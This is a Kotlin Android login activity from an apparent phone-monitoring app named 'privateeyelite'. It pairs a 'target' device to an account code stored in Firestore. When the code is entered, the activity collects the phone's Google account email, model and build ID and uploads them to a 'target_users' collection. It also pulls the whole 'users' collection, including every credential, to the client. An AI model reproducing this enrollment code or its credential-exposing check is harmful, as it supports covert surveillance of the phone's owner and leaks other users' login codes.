package com.rashediqbal.privateeyelite

import `in`.aabhasjindal.otptextview.OTPListener
import `in`.aabhasjindal.otptextview.OtpTextView
import android.accounts.AccountManager
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Patterns
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.github.ybq.android.spinkit.style.ThreeBounce
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase


class AuthActivity : AppCompatActivity() {

    val db = Firebase.firestore

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_auth)


        val inputCredential = findViewById<OtpTextView>(R.id.inputCredential)
        val errorText = findViewById<TextView>(R.id.errorText)

        val progressBar = findViewById<ProgressBar>(R.id.spin_kit)
        progressBar.indeterminateDrawable = ThreeBounce()

        // Get Gmail and PhoneName
        val gmailPattern = Patterns.EMAIL_ADDRESS
        val accounts = AccountManager.get(this@AuthActivity).accounts
        val gmail = if (gmailPattern.matcher(accounts[0].name).matches()) accounts[0].name else ""
        val phoneName = Build.MANUFACTURER + " " + Build.MODEL
        val validate = Build.ID

        val sessionManager = SessionManager(this)


        inputCredential.otpListener = object : OTPListener {
            override fun onInteractionListener() {
                // fired when user types something in the Otpbox
                inputCredential.resetState()
                errorText.visibility = View.GONE
            }

            override fun onOTPComplete(otp: String) {
                progressBar.visibility = View.VISIBLE
                // fired when user has entered the OTP fully.
                val target = "${Build.MODEL.lowercase()}${otp}"
                // checking start

                db.collection("users").get()
                    .addOnSuccessListener { result ->
                        val isCredential = result!!.find { it.data["credential"] == otp }
                        if (isCredential != null){
                            val data = isCredential.data
                            val email = isCredential.id

                            if(data["target"] != target){
                                val hashMap = hashMapOf<String, Any>(
                                    "device_name" to phoneName,
                                    "gmail" to gmail,
                                    "device_id" to validate
                                )
                                db.collection("users").document(email).update("target", target)
                                    .addOnSuccessListener {
                                        db.collection("target_users").document(target).set(hashMap)
                                            .addOnSuccessListener {
                                                //? success area

                                                progressBar.visibility = View.GONE
                                                inputCredential.showSuccess()
                                                findViewById<TextView>(R.id.successText).visibility = View.VISIBLE
                                                sessionManager.saveUser(otp,target)
                                                Toast.makeText(this@AuthActivity, "Login Successful", Toast.LENGTH_SHORT).show()
                                                startActivity(Intent(this@AuthActivity, PermissionActivity::class.java))
                                                finish()

                                            }
                                    }
                            }else if (data["target"] == target) {
                                db.collection("target_users").document(target).get()
                                    .addOnSuccessListener { target_user ->
                                        val targetUserData = target_user.data
                                        if (targetUserData?.get("device_id") == validate){
                                            //success area

                                            progressBar.visibility = View.GONE
                                            inputCredential.showSuccess()
                                            findViewById<TextView>(R.id.successText).visibility = View.VISIBLE
                                            sessionManager.saveUser(otp,target)
                                            Toast.makeText(this@AuthActivity, "Login Successful", Toast.LENGTH_SHORT).show()
                                            startActivity(Intent(this@AuthActivity, PermissionActivity::class.java))
                                            finish()
                                        }
                                    }
                            }

                        } else {
                            // failed area
                            progressBar.visibility = View.GONE
                            errorText.visibility = View.VISIBLE
                            errorText.text =  getString(R.string.invalid_credential)
                            inputCredential.showError()
                        }


                    }




            }
        }



//                                if ( || data["device_id"] != validate){
//
//                                    db.collection("users").document(email).update(map)
//                                        .addOnSuccessListener {
//
//
//                                            db.collection("target_users").document(target).set(hashMap)
//                                                .addOnSuccessListener {
//                                                    //? success area
//                                                    progressBar.visibility = View.GONE
//                                                    inputCredential.showSuccess()
//                                                    findViewById<TextView>(R.id.successText).visibility = View.VISIBLE
//                                                    Toast.makeText(this@AuthActivity, "Login Successful", Toast.LENGTH_SHORT).show()
//                                                }
//                                                .addOnFailureListener {
//                                                    progressBar.visibility = View.GONE
//                                                    errorText.visibility = View.VISIBLE
//                                                    errorText.text =  "Server Error 3"
//                                                    inputCredential.showError()
//                                                }
//
//                                        }.addOnFailureListener {
//                                            progressBar.visibility = View.GONE
//                                            errorText.visibility = View.VISIBLE
//                                            errorText.text =  "Server Error 2"
//                                            inputCredential.showError()
//                                        }
//                                } else {
//                                    progressBar.visibility = View.GONE
//                                    errorText.visibility = View.VISIBLE
//                                    errorText.text =  "Credential already used!!!!"
//                                    inputCredential.showError()
//                                }
//
//
//                            } else {
//                                progressBar.visibility = View.GONE
//                                errorText.visibility = View.VISIBLE
//                                errorText.text =  "Invalid Credential"
//                                inputCredential.showError()
//                            }
//
//                        }
//                    }
//                    .addOnFailureListener {
//                        progressBar.visibility = View.GONE
//                        errorText.visibility = View.VISIBLE
//                        errorText.text =  "Server Error 1"
//                        inputCredential.showError()
//                    }





    }

}